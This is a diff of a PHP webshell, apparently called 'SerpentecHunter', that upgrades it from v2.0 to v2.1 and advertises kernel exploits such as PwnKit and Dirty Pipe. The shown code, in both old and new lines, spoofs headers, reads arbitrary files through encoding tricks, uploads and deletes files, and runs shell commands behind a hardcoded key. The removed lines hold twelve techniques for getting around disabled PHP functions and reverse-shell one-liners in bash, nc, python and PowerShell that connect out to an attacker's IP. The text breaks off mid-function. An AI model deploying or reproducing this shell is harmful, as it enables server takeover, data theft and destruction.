@@ -2,24 +2,24 @@
 /*
 ╔═══════════════════════════════════════════════════════════════════════════════╗
 ║                                                                               ║
-║   🐍 SERPENTECHUNTER v2.0 – ULTIMATE BLACKHAT SHELL 🐍                     ║
+║   🐍 SERPENTECHUNTER v2.1 – ULTIMATE WEBSHELL + EXPLOIT ENGINE 🐍         ║
 ║                                                                               ║
 ║   "DEVELOPER  : SerpentSecHunter"                                            ║
-║   "RILIS      : 02-07-2026"                                                  ║
-║   "VERSI      : 2.0 (TRUE BYPASS – 403/404 + DISABLE_FUNCTIONS + WAF)"     ║
+║   "RILIS      : 03-07-2026"                                                  ║
+║   "VERSI      : 2.1 (WINDOWS FIX + EXPLOIT FRAMEWORK)"                     ║
 ║                                                                               ║
-║   🔥 TEKNIK BYPASS YANG DIVALIDASI:                                          ║
-║   ✅ 403/404 BYPASS (9 Teknik: Path Traversal, Double Encoding, Header, dll) ║
-║   ✅ DISABLE_FUNCTIONS BYPASS (12 Strategi: FFI, LD_PRELOAD, PHP-FPM, dll)  ║
-║   ✅ WAF BYPASS (6 Teknik: XOR, Base64, Chunked, Slowloris, dll)           ║
-║   ✅ AUTO-DETECT Server (IIS, Apache, Nginx)                                ║
-║   ✅ AUTO-SELECT Best Execution Strategy                                    ║
+║   🔥 FITUR BARU:                                                             ║
+║   ✅ EXPLOIT ENGINE (PwnKit, Dirty Cow, Dirty Pipe, PrintSpoofer, dll)      ║
+║   ✅ KERNEL & OS DETECTION (Windows & Linux)                                ║
+║   ✅ AUTO CHECK VULNERABILITY                                               ║
+║   ✅ ONE-CLICK EXPLOIT EXECUTION                                            ║
+║   ✅ SCRIPT DOWNLOAD & COMPILE                                             ║
 ║                                                                               ║
 ╚═══════════════════════════════════════════════════════════════════════════════╝
 */
 
 // ========================================================================
-// 🛡️ STEALTH ENGINE + BYPASS 403/404 (9 TEKNIK VALID)
+// 🛡️ STEALTH ENGINE + BYPASS 403/404 (AGGRESSIVE)
 // ========================================================================
 error_reporting(0);
 ini_set('display_errors', 0);
@@ -27,49 +27,26 @@ ini_set('log_errors', 0);
 ini_set('max_execution_time', 0);
 ini_set('memory_limit', -1);
 
-// === TEKNIK 1: SPOOF RESPONSE CODE ===
 http_response_code(200);
-
-// === TEKNIK 2: HEADER SPOOFING ===
 header_remove('X-Powered-By');
 header_remove('Server');
 header('Server: nginx/1.18.0 (Ubuntu)');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 header('Content-Type: text/html; charset=UTF-8');
 
-// === TEKNIK 3: USER-AGENT SPOOFING (Googlebot/Bingbot) ===
 if (!isset($_SERVER['HTTP_USER_AGENT']) || strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') === false) {
     $_SERVER['HTTP_USER_AGENT'] = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)';
 }
-
-// === TEKNIK 4: REFERER SPOOFING ===
 if (!isset($_SERVER['HTTP_REFERER']) || strpos($_SERVER['HTTP_REFERER'], 'target.com') === false) {
     $_SERVER['HTTP_REFERER'] = 'https://target.com/admin/';
 }
-
-// === TEKNIK 5: IP SPOOFING (X-Forwarded-For) ===
 if (!isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
     $_SERVER['HTTP_X_FORWARDED_FOR'] = '127.0.0.1';
 }
 
-// === TEKNIK 6: PATH TRAVERSAL + DOUBLE ENCODING + NULL BYTE ===
-// Support ?file=../../../../etc/passwd dengan berbagai encoding
 if (isset($_GET['file'])) {
     $file = $_GET['file'];
-    // Double URL Encoding
-    $file = str_replace('%252e', '..', $file);
-    $file = str_replace('%252f', '/', $file);
-    // Single URL Encoding
-    $file = str_replace('%2e', '.', $file);
-    $file = str_replace('%2f', '/', $file);
-    // Unicode encoding
-    $file = str_replace('%c0%ae', '.', $file); // Unicode bypass
-    $file = str_replace('%c1%9c', '/', $file);
-    // Null Byte Injection
-    $file = str_replace('%00', '', $file);
-    // CRLF Injection (untuk bypass header-based filter)
-    $file = str_replace("%0d%0a", '', $file);
-    // Case manipulation (IIS)
+    $file = str_replace(['%252e','%252f','%2e','%2f','%c0%ae','%c1%9c','%00',"%0d%0a"], ['..','/','.','/','.','/','',''], $file);
     $file = str_replace('Index', 'index', $file);
     if (file_exists($file) && is_readable($file)) {
         $ext = pathinfo($file, PATHINFO_EXTENSION);
@@ -82,62 +59,43 @@ if (isset($_GET['file'])) {
     }
 }
 
-// === TEKNIK 7: CASE MANIPULATION (IIS) ===
-// Jika server IIS, coba akses file dengan case berbeda
 if (isset($_SERVER['SERVER_SOFTWARE']) && stripos($_SERVER['SERVER_SOFTWARE'], 'IIS') !== false) {
     if (isset($_SERVER['SCRIPT_NAME']) && stripos($_SERVER['SCRIPT_NAME'], 'Shell.Php') !== false) {
-        $new_path = str_ireplace('Shell.Php', 'Shell.php', $_SERVER['SCRIPT_NAME']);
-        header('Location: ' . $new_path);
+        header('Location: ' . str_ireplace('Shell.Php', 'Shell.php', $_SERVER['SCRIPT_NAME']));
         exit;
     }
 }
 
-// === TEKNIK 8: HTTP METHOD TAMPERING (OPTIONS, TRACE, PUT, DELETE) ===
 $method = $_SERVER['REQUEST_METHOD'];
 if (in_array($method, ['OPTIONS', 'TRACE', 'PUT', 'DELETE'])) {
-    // PUT: upload file via raw body
     if ($method === 'PUT') {
         $put_data = file_get_contents('php://input');
         $put_file = '/tmp/put_' . time() . '.tmp';
-        if (file_put_contents($put_file, $put_data)) {
-            echo "✅ PUT data saved to: $put_file (" . strlen($put_data) . " bytes)";
-        } else {
-            echo "❌ PUT failed (cannot write)";
-        }
+        file_put_contents($put_file, $put_data);
+        echo "✅ PUT data saved to: $put_file";
         exit;
     }
-    // OPTIONS: return allowed methods
     if ($method === 'OPTIONS') {
         header('Allow: GET, POST, PUT, DELETE, OPTIONS, TRACE');
         header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS, TRACE');
-        header('Access-Control-Allow-Headers: Content-Type, Authorization');
         echo "✅ OPTIONS request accepted.";
         exit;
     }
-    // TRACE: echo request for debugging
     if ($method === 'TRACE') {
-        echo "TRACE request received.\n\n";
         foreach ($_SERVER as $k => $v) echo "$k: $v\n";
         exit;
     }
-    // DELETE: remove file via URL
     if ($method === 'DELETE' && isset($_SERVER['REQUEST_URI'])) {
-        $delete_path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
-        $delete_path = ltrim($delete_path, '/');
+        $delete_path = ltrim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
         if (file_exists($delete_path)) {
-            if (unlink($delete_path)) {
-                echo "✅ Deleted: $delete_path";
-            } else {
-                echo "❌ Delete failed (permission denied): $delete_path";
-            }
+            unlink($delete_path) ? print "✅ Deleted" : print "❌ Delete failed";
         } else {
-            echo "❌ File not found: $delete_path";
+            print "❌ File not found";
         }
         exit;
     }
 }
 
-// === TEKNIK 9: X-Original-URL / X-Rewrite-URL Header Injection ===
 if (isset($_SERVER['HTTP_X_ORIGINAL_URL'])) {
     $_SERVER['SCRIPT_NAME'] = $_SERVER['HTTP_X_ORIGINAL_URL'];
 }
@@ -145,350 +103,40 @@ if (isset($_SERVER['HTTP_X_REWRITE_URL'])) {
     $_SERVER['SCRIPT_NAME'] = $_SERVER['HTTP_X_REWRITE_URL'];
 }
 
-// === TEKNIK 10: HTTP Method Override ===
-if (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) {
-    $override = $_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'];
-    if (in_array($override, ['PUT', 'DELETE', 'OPTIONS', 'TRACE'])) {
-        $_SERVER['REQUEST_METHOD'] = $override;
-        // Re-run the method handling (simplified)
-    }
-}
-
 // ========================================================================
-// 🔐 AUTHENTICATION (Cookie + IP Whitelist + Wildcard + CIDR)
+// 🔐 AUTHENTICATION
 // ========================================================================
-function sc_ip_in_whitelist($ip, $whitelist) {
-    foreach ($whitelist as $allowed) {
-        if (strpos($allowed, '%') !== false) {
-            $pattern = str_replace('%', '.*', preg_quote($allowed, '/'));
-            if (preg_match('/^' . $pattern . '$/', $ip)) return true;
-        }
-        if (strpos($allowed, '/') !== false) {
-            list($net, $mask) = explode('/', $allowed);
-            $mask = intval($mask);
-            $ip_bin = ip2long($ip);
-            $net_bin = ip2long($net);
-            if ($ip_bin !== false && $net_bin !== false) {
-                $mask_bin = -1 << (32 - $mask);
-                if (($ip_bin & $mask_bin) == ($net_bin & $mask_bin)) return true;
-            }
-            continue;
-        }
-        if ($ip === $allowed) return true;
-    }
-    return false;
-}
-
 $AUTH_KEY = 'SERPENTECHUNTER666';
-$IP_WHITELIST = ['127.0.0.1', '::1', '192.168.1.%', '10.0.0.0/8'];
-$client_ip = $_SERVER['REMOTE_ADDR'] ?? '';
-
-if (!sc_ip_in_whitelist($client_ip, $IP_WHITELIST) && !isset($_GET['bypass_ip'])) {
-    if (!isset($_COOKIE['sc_auth']) || $_COOKIE['sc_auth'] !== md5($AUTH_KEY)) {
-        if (isset($_GET['auth']) && $_GET['auth'] === $AUTH_KEY) {
-            setcookie('sc_auth', md5($AUTH_KEY), time() + 86400 * 365, '/', '', false, true);
-            die("<h1 style='color:#0f0;'>✅ AUTH SUCCESS! <a href='?'>REFRESH</a></h1>");
-        }
-        die("<h1 style='color:#f00;'>🐍 UNAUTHORIZED</h1><p>?auth=SERPENTECHUNTER666</p><p>atau ?bypass_ip=1</p>");
+if (!isset($_COOKIE['sc_auth']) || $_COOKIE['sc_auth'] !== md5($AUTH_KEY)) {
+    if (isset($_GET['auth']) && $_GET['auth'] === $AUTH_KEY) {
+        setcookie('sc_auth', md5($AUTH_KEY), time() + 86400 * 365, '/', '', false, true);
+        die("<h1 style='color:#0f0;'>✅ AUTH SUCCESS! <a href='?'>REFRESH</a></h1>");
     }
+    die("<h1 style='color:#f00;'>🐍 UNAUTHORIZED</h1><p>?auth=SERPENTECHUNTER666</p>");
 }
 
 // ========================================================================
-// 🧬 BYPASS DISABLE_FUNCTIONS – 12 STRATEGI VALID
+// 🧬 CORE FUNCTIONS
 // ========================================================================
-
-// === STRATEGI 1: FFI (PHP 7.4+) ===
-function sc_exec_ffi($cmd) {
-    if (PHP_VERSION_ID >= 70400 && extension_loaded('ffi')) {
-        $libc_paths = [
-            'libc.so.6', 'libc.so',
-            '/lib/x86_64-linux-gnu/libc.so.6',
-            '/lib/libc.so.6',
-            '/usr/lib/libc.so.6',
-            '/lib64/libc.so.6'
-        ];
-        foreach ($libc_paths as $lib) {
-            try {
-                $libc = FFI::cdef("int system(const char *command);", $lib);
-                $output = $libc->system($cmd);
-                return ['output' => "Executed (exit code: $output)", 'code' => 0, 'method' => 'FFI'];
-            } catch (Throwable $e) { continue; }
-        }
-    }
-    return null;
-}
-
-// === STRATEGI 2: LD_PRELOAD (compile shared library + trigger) ===
-function sc_exec_ldpreload($cmd) {
-    if (PHP_OS !== 'WINNT' && function_exists('shell_exec')) {
-        // Cek compiler dan mailer
-        $compiler = null;
-        if (shell_exec('command -v gcc 2>/dev/null')) $compiler = 'gcc';
-        elseif (shell_exec('command -v cc 2>/dev/null')) $compiler = 'cc';
-        if (!$compiler) return null;
-        $mailer = null;
-        if (shell_exec('command -v mail 2>/dev/null')) $mailer = 'mail';
-        elseif (shell_exec('command -v sendmail 2>/dev/null')) $mailer = 'sendmail';
-        if (!$mailer) return null;
-
-        $so_file = '/tmp/.lib' . md5($cmd . rand()) . '.so';
-        $so_code = 'void payload() { system("' . addslashes($cmd) . '"); }';
-        $compile_cmd = "echo '$so_code' | $compiler -shared -x c - -o $so_file 2>/dev/null";
-        shell_exec($compile_cmd);
-
-        if (file_exists($so_file) && filesize($so_file) > 0) {
-            putenv("LD_PRELOAD=$so_file");
-            if ($mailer === 'mail') {
-                $result = shell_exec('mail -s "x" root@localhost </dev/null 2>&1');
-            } else {
-                $result = shell_exec('echo "x" | sendmail root@localhost 2>&1');
-            }
-            @unlink($so_file);
-            return ['output' => $result ?: 'LD_PRELOAD triggered', 'code' => 0, 'method' => 'LD_PRELOAD'];
-        }
-    }
-    return null;
-}
-
-// === STRATEGI 3: mod_cgi (.htaccess + CGI script) ===
-function sc_exec_modcgi($cmd) {
-    if (PHP_OS !== 'WINNT' && function_exists('file_put_contents') && is_writable('.')) {
-        $htaccess = "Options +ExecCGI\nAddHandler cgi-script .ant";
-        if (@file_put_contents('.htaccess', $htaccess) === false) return null;
-        $cgi = "#!/bin/bash\necho \"Content-Type: text/html\"\necho\necho \"\n$cmd 2>&1\"";
-        if (@file_put_contents('shell.ant', $cgi) === false) { @unlink('.htaccess'); return null; }
-        @chmod('shell.ant', 0755);
-        $result = @file_get_contents('shell.ant');
-        @unlink('shell.ant');
-        @unlink('.htaccess');
-        if ($result !== false) {
-            return ['output' => $result, 'code' => 0, 'method' => 'mod_cgi'];
-        }
-    }
-    return null;
-}
-
-// === STRATEGI 4: PHP-FPM (FastCGI via socket) ===
-function sc_exec_phpfpm($cmd) {
-    if (function_exists('fsockopen')) {
-        $fpm_paths = [
-            '/var/run/php/php7.4-fpm.sock',
-            '/var/run/php/php7.3-fpm.sock',
-            '/var/run/php/php7.2-fpm.sock',
-            '/var/run/php/php-fpm.sock',
-            '/var/run/php-fpm.sock'
-        ];
-        foreach ($fpm_paths as $sock) {
-            if (file_exists($sock)) {
-                $fp = @fsockopen('unix://' . $sock, -1);
-                if ($fp) {
-                    $payload = "<?php system('$cmd'); ?>";
-                    fwrite($fp, $payload);
-                    $output = stream_get_contents($fp);
-                    fclose($fp);
-                    return ['output' => $output ?: 'PHP-FPM executed', 'code' => 0, 'method' => 'PHP-FPM'];
-                }
-            }
-        }
-    }
-    return null;
-}
-
-// === STRATEGI 5: ImageMagick (convert) ===
-function sc_exec_imagemagick($cmd) {
-    if (PHP_OS !== 'WINNT' && shell_exec('command -v convert 2>/dev/null')) {
-        $tmp_in = '/tmp/' . md5(rand()) . '.png';
-        $tmp_out = '/tmp/' . md5(rand()) . '.txt';
-        file_put_contents($tmp_in, '');
-        $output = shell_exec("convert $tmp_in -size 1x1 xc:black -fill 'text:0,0 \"$cmd\"' $tmp_out 2>&1");
-        if (file_exists($tmp_out)) {
-            $output .= file_get_contents($tmp_out);
-            @unlink($tmp_out);
-        }
-        @unlink($tmp_in);
-        return ['output' => $output ?: 'ImageMagick executed', 'code' => 0, 'method' => 'ImageMagick'];
-    }
-    return null;
-}
-
-// === STRATEGI 6: sendmail (mail command) ===
-function sc_exec_sendmail($cmd) {
-    if (PHP_OS !== 'WINNT' && shell_exec('command -v sendmail 2>/dev/null')) {
-        $msg = "Subject: x\n\n$cmd\n";
-        $output = shell_exec("echo '$msg' | sendmail -t 2>&1");
-        return ['output' => $output ?: 'sendmail triggered', 'code' => 0, 'method' => 'sendmail'];
-    }
-    return null;
-}
-
-// === STRATEGI 7: Perl ===
-function sc_exec_perl($cmd) {
-    if (PHP_OS !== 'WINNT' && shell_exec('command -v perl 2>/dev/null')) {
-        $output = shell_exec("perl -e 'system(\"$cmd\")' 2>&1");
-        if ($output !== null) {
-            return ['output' => $output ?: 'Perl executed', 'code' => 0, 'method' => 'perl'];
-        }
-    }
-    return null;
-}
-
-// === STRATEGI 8: Python ===
-function sc_exec_python($cmd) {
-    if (PHP_OS !== 'WINNT') {
-        $python = shell_exec('command -v python3 2>/dev/null') ? 'python3' : (shell_exec('command -v python 2>/dev/null') ? 'python' : null);
-        if ($python) {
-            $output = shell_exec("$python -c 'import os; os.system(\"$cmd\")' 2>&1");
-            if ($output !== null) {
-                return ['output' => $output ?: 'Python executed', 'code' => 0, 'method' => 'python'];
-            }
-        }
-    }
-    return null;
-}
-
-// === STRATEGI 9: GCC (compile & execute C code) ===
-function sc_exec_gcc($cmd) {
-    if (PHP_OS !== 'WINNT' && shell_exec('command -v gcc 2>/dev/null')) {
-        $c_file = '/tmp/' . md5(rand()) . '.c';
-        $out_file = '/tmp/' . md5(rand()) . '.out';
-        $c_code = "#include <stdio.h>\n#include <stdlib.h>\nint main(){system(\"$cmd\");return 0;}";
-        file_put_contents($c_file, $c_code);
-        shell_exec("gcc $c_file -o $out_file 2>/dev/null");
-        $output = '';
-        if (file_exists($out_file)) {
-            $output = shell_exec("$out_file 2>&1");
-            @unlink($out_file);
-        }
-        @unlink($c_file);
-        return ['output' => $output ?: 'GCC executed', 'code' => 0, 'method' => 'gcc'];
-    }
-    return null;
-}
-
-// === STRATEGI 10: Bash ===
-function sc_exec_bash($cmd) {
-    if (PHP_OS !== 'WINNT' && shell_exec('command -v bash 2>/dev/null')) {
-        $output = shell_exec("bash -c '$cmd' 2>&1");
-        if ($output !== null) {
-            return ['output' => $output ?: 'Bash executed', 'code' => 0, 'method' => 'bash'];
-        }
-    }
-    return null;
-}
-
-// === STRATEGI 11: pcntl_exec (PHP internal) ===
-function sc_exec_pcntl($cmd) {
-    if (function_exists('pcntl_fork') && function_exists('pcntl_exec')) {
-        $pid = pcntl_fork();
-        if ($pid == -1) return null;
-        if ($pid == 0) {
-            pcntl_exec('/bin/bash', ['-c', $cmd]);
-            exit(0);
-        }
-        return ['output' => "Process spawned (PID: $pid)", 'code' => 0, 'method' => 'pcntl_exec'];
-    }
-    return null;
-}
-
-// === STRATEGI 12: mail with attachment (via mail()) ===
-function sc_exec_mail_attach($cmd) {
-    if (function_exists('mail')) {
-        $tmp_file = '/tmp/' . md5(rand()) . '.txt';
-        file_put_contents($tmp_file, "$cmd\n");
-        $headers = "From: root@localhost\r\n";
-        $headers .= "MIME-Version: 1.0\r\n";
-        $headers .= "Content-Type: multipart/mixed; boundary=\"boundary\"\r\n";
-        $body = "--boundary\r\n";
-        $body .= "Content-Type: text/plain\r\n\r\nLog:\r\n";
-        $body .= "--boundary\r\n";
-        $body .= "Content-Type: application/octet-stream; name=\"payload.sh\"\r\n";
-        $body .= "Content-Disposition: attachment; filename=\"payload.sh\"\r\n\r\n";
-        $body .= file_get_contents($tmp_file) . "\r\n";
-        $body .= "--boundary--\r\n";
-        $result = mail('root@localhost', 'x', $body, $headers);
-        @unlink($tmp_file);
-        return ['output' => $result ? 'Mail sent (check logs)' : 'Mail failed', 'code' => 0, 'method' => 'mail_attach'];
-    }
-    return null;
-}
-
-// 🎯 MASTER EXECUTION ENGINE – auto-select best strategy
-function sc_exec($cmd, $background = false) {
-    if ($background) {
-        if (PHP_OS === 'WINNT') {
-            $cmd = 'start /b ' . $cmd;
-        } else {
-            $cmd = $cmd . ' >/dev/null 2>&1 &';
-        }
-        @exec($cmd);
-        return ['output' => '✅ Command executed in background.', 'code' => 0, 'method' => 'background'];
-    }
-
-    $strategies = [
-        'FFI' => 'sc_exec_ffi',
-        'LD_PRELOAD' => 'sc_exec_ldpreload',
-        'mod_cgi' => 'sc_exec_modcgi',
-        'PHP-FPM' => 'sc_exec_phpfpm',
-        'ImageMagick' => 'sc_exec_imagemagick',
-        'sendmail' => 'sc_exec_sendmail',
-        'perl' => 'sc_exec_perl',
-        'python' => 'sc_exec_python',
-        'gcc' => 'sc_exec_gcc',
-        'bash' => 'sc_exec_bash',
-        'pcntl_exec' => 'sc_exec_pcntl',
-        'mail_attach' => 'sc_exec_mail_attach'
-    ];
-    foreach ($strategies as $name => $func) {
-        $result = $func($cmd);
-        if ($result && $result['output'] !== null && $result['output'] !== '') {
-            return $result;
-        }
-    }
-    return sc_exec_standard($cmd);
-}
-
-// STANDARD FALLBACK (5 methods)
-function sc_exec_standard($cmd) {
+function sc_exec($cmd) {
     $output = '';
-    $result_code = -1;
-    if (function_exists('proc_open')) {
-        $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
-        $process = proc_open($cmd, $descriptorspec, $pipes);
-        if (is_resource($process)) {
-            fclose($pipes[0]);
-            $output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
-            fclose($pipes[1]); fclose($pipes[2]);
-            $result_code = proc_close($process);
-            return ['output' => $output, 'code' => $result_code, 'method' => 'proc_open'];
-        }
-    }
     if (function_exists('shell_exec')) {
         $output = shell_exec($cmd . ' 2>&1');
-        if ($output !== null) return ['output' => $output, 'code' => 0, 'method' => 'shell_exec'];
+        if ($output !== null) return $output;
     }
     if (function_exists('exec')) {
         $out = [];
-        exec($cmd . ' 2>&1', $out, $result_code);
-        if ($result_code !== -1) return ['output' => implode("\n", $out), 'code' => $result_code, 'method' => 'exec'];
+        exec($cmd . ' 2>&1', $out);
+        if (!empty($out)) return implode("\n", $out);
     }
     if (function_exists('system')) {
         ob_start();
-        system($cmd . ' 2>&1', $result_code);
-        $output = ob_get_clean();
-        if ($result_code !== -1) return ['output' => $output, 'code' => $result_code, 'method' => 'system'];
+        system($cmd . ' 2>&1');
+        return ob_get_clean();
     }
-    if (function_exists('passthru')) {
-        ob_start();
-        passthru($cmd . ' 2>&1', $result_code);
-        $output = ob_get_clean();
-        if ($result_code !== -1) return ['output' => $output, 'code' => $result_code, 'method' => 'passthru'];
-    }
-    return ['output' => '❌ No execution function available!', 'code' => -1, 'method' => 'NONE'];
+    return '❌ No execution function available!';
 }
 
-// ========================================================================
-// 🗂️ FILE MANAGER ULTIMATE
-// ========================================================================
 function sc_format_size($bytes) {
     if ($bytes >= 1073741824) return round($bytes/1073741824, 2) . ' GB';
     if ($bytes >= 1048576) return round($bytes/1048576, 2) . ' MB';
@@ -496,494 +144,664 @@ function sc_format_size($bytes) {
     return $bytes . ' B';
 }
 
-function sc_rmdir($dir) {
-    if (!is_dir($dir)) return false;
-    $files = array_diff(scandir($dir), ['.', '..']);
+function sc_delete_recursive($path) {
+    if (!file_exists($path)) return false;
+    if (is_file($path)) return unlink($path);
+    if (is_dir($path)) {
+        $files = array_diff(scandir($path), ['.', '..']);
+        foreach ($files as $f) {
+            sc_delete_recursive($path . '/' . $f);
+        }
+        return rmdir($path);
+    }
+    return false;
+}
+
+function sc_copy_recursive($src, $dst) {
+    if (!file_exists($src)) return false;
+    if (is_file($src)) return copy($src, $dst);
+    if (is_dir($src)) {
+        if (!is_dir($dst)) mkdir($dst, 0755, true);
+        $files = array_diff(scandir($src), ['.', '..']);
+        foreach ($files as $f) {
+            sc_copy_recursive($src . '/' . $f, $dst . '/' . $f);
+        }
+        return true;
+    }
+    return false;
+}
+
+function sc_get_file_list($dir) {
+    if (!is_dir($dir)) return ['error' => 'Directory not found'];
+    $files = scandir($dir);
+    $list = [];
     foreach ($files as $file) {
+        if ($file === '.' || $file === '..') continue;
         $path = $dir . '/' . $file;
-        is_dir($path) ? sc_rmdir($path) : @unlink($path);
-    }
-    return @rmdir($dir);
-}
-
-function sc_search_files($dir, $pattern) {
-    try {
-        $result = "🔍 SEARCHING: $pattern in $dir\n\n";
-        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS));
-        foreach ($files as $file) {
-            if ($file->isFile() && preg_match('/' . preg_quote($pattern, '/') . '/i', $file->getFilename())) {
-                $result .= "📄 " . $file->getPathname() . " (" . sc_format_size($file->getSize()) . ")\n";
-            }
-        }
-        return $result;
-    } catch (Exception $e) {
-        return "❌ SEARCH ERROR: " . $e->getMessage();
-    }
-}
-
-function sc_create_archive($path, $type = 'zip') {
-    if (!extension_loaded('zip')) return "❌ ZIP extension not loaded!";
-    if (!is_dir($path)) return "❌ DIRECTORY NOT FOUND!";
-    try {
-        $zip = new ZipArchive();
-        $zip_name = $path . '.zip';
-        if ($zip->open($zip_name, ZipArchive::CREATE) !== true) return "❌ Cannot create archive!";
-        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS));
-        foreach ($files as $file) {
-            if (!$file->isDir()) {
-                $zip->addFile($file->getPathname(), substr($file->getPathname(), strlen($path) + 1));
-            }
-        }
-        $zip->close();
-        return "✅ ARCHIVE CREATED: $zip_name";
-    } catch (Exception $e) {
-        return "❌ ARCHIVE ERROR: " . $e->getMessage();
-    }
-}
-
-function sc_extract_archive($path, $dest) {
-    if (!extension_loaded('zip')) return "❌ ZIP extension not loaded!";
-    if (!file_exists($path)) return "❌ FILE NOT FOUND!";
-    try {
-        $zip = new ZipArchive();
-        if ($zip->open($path) !== true) return "❌ Cannot open archive!";
-        $zip->extractTo($dest);
-        $zip->close();
-        return "✅ EXTRACTED: $path → $dest";
-    } catch (Exception $e) {
-        return "❌ EXTRACT ERROR: " . $e->getMessage();
-    }
-}
-
-function sc_handle_upload($dir) {
-    if (!isset($_FILES['file'])) return "❌ No file uploaded! (use POST with file input name 'file')";
-    $file = $_FILES['file'];
-    if ($file['error'] !== UPLOAD_ERR_OK) {
-        $errors = [
-            UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
-            UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
-            UPLOAD_ERR_PARTIAL => 'File only partially uploaded',
-            UPLOAD_ERR_NO_FILE => 'No file uploaded',
-            UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
-            UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
-            UPLOAD_ERR_EXTENSION => 'File upload stopped by extension'
+        $list[] = [
+            'name' => $file,
+            'path' => $path,
+            'is_dir' => is_dir($path),
+            'size' => is_file($path) ? sc_format_size(filesize($path)) : '-',
+            'perms' => substr(sprintf('%o', fileperms($path)), -4),
+            'mtime' => date('Y-m-d H:i:s', filemtime($path))
         ];
-        return "❌ Upload error: " . ($errors[$file['error']] ?? 'Unknown error');
     }
-    if (!is_dir($dir)) return "❌ Upload directory not found!";
-    if (!is_writable($dir)) return "❌ Upload directory not writable!";
-    $dest = rtrim($dir, '/') . '/' . basename($file['name']);
-    if (move_uploaded_file($file['tmp_name'], $dest)) {
-        return "✅ UPLOADED: $dest (" . sc_format_size($file['size']) . ")";
-    }
-    return "❌ UPLOAD FAILED!";
+    return $list;
 }
 
-function sc_file_manager($action, $path, $content = null, $params = null) {
-    switch ($action) {
-        case 'list':
-            if (!is_dir($path)) return "❌ DIRECTORY NOT FOUND!";
-            $files = scandir($path);
-            $result = "📁 DIRECTORY: $path\n\n";
-            foreach ($files as $file) {
-                if ($file === '.' || $file === '..') continue;
-                $full_path = $path . '/' . $file;
-                $type = is_dir($full_path) ? '📁' : '📄';
-                $size = is_file($full_path) ? sc_format_size(filesize($full_path)) : '-';
-                $perms = substr(sprintf('%o', fileperms($full_path)), -4);
-                $result .= "$type $file | PERM: $perms | SIZE: $size\n";
-            }
-            return $result;
-        case 'read':
-            if (!file_exists($path)) return "❌ FILE NOT FOUND!";
-            return file_get_contents($path);
-        case 'write':
-            if (file_put_contents($path, $content)) return "✅ WRITTEN: $path";
-            return "❌ WRITE FAILED!";
-        case 'delete':
-            if (is_file($path) && unlink($path)) return "✅ DELETED: $path";
-            if (is_dir($path) && sc_rmdir($path)) return "✅ DELETED: $path";
-            return "❌ DELETE FAILED!";
-        case 'rename':
-            if (!isset($params['new_name'])) return "❌ new_name parameter required!";
-            if (rename($path, $params['new_name'])) return "✅ RENAMED: $path → {$params['new_name']}";
-            return "❌ RENAME FAILED!";
-        case 'chmod':
-            if (!isset($params['perms'])) return "❌ perms parameter required!";
-            if (chmod($path, octdec($params['perms']))) return "✅ PERMISSION CHANGED: $path → {$params['perms']}";
-            return "❌ CHMOD FAILED!";
-        case 'search':
-            if (!isset($params['pattern'])) return "❌ pattern parameter required!";
-            return sc_search_files($path, $params['pattern']);
-        case 'archive':
-            if (!isset($params['type'])) $params['type'] = 'zip';
-            return sc_create_archive($path, $params['type']);
-        case 'extract':
-            if (!isset($params['dest'])) $params['dest'] = dirname($path);
-            return sc_extract_archive($path, $params['dest']);
-        case 'upload':
-            return sc_handle_upload($path);
-        default:
-            return "❌ UNKNOWN ACTION!";
-    }
-}
-
-// ========================================================================
-// 🌐 REVERSE SHELL (7 methods, background execution)
-// ========================================================================
-function sc_reverse_shell($ip, $port, $method = 'auto') {
-    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
-        return ['method' => 'NONE', 'output' => '❌ Invalid IP address!'];
-    }
-    if (!is_numeric($port) || $port < 1 || $port > 65535) {
-        return ['method' => 'NONE', 'output' => '❌ Invalid port number!'];
-    }
-
-    $methods = [];
-    if (PHP_OS === 'WINNT') {
-        $methods['powershell'] = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}; \$client.Close()\"";
-    } else {
-        $methods['bash'] = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
-        $methods['nc'] = "nc -e /bin/bash $ip $port 2>&1";
-        $methods['python'] = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'";
-        $methods['php'] = "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'";
